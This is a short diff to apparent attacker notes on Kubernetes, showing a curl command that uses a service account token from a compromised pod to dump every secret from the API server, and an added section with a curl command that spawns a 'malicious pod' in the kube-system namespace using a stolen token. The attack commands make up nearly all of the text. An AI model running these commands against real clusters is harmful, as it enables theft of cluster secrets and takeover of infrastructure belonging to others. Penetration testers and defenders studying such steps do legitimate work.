@@ -8,3 +8,9 @@ If a attacker is able to overtake a pod he has access to the service accounts JW
 ````
 curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://<controlpane-ip>:6443/api/v1/namespaces/cloud-idp/secrets | jq  -r ".items[].data"
 ````
+
+## Spawn a malicious pod via API
+
+Sometimes, it's necessary to spawn a pod with a stolen Token via curl
+````
+curl -k -X POST -H "Authorization: Bearer $Token" -H "Content-Type: application/json" https://<controlpane-ip>:6443/api/v1/namespaces/kube-system/pods -d @maliciousPod.json
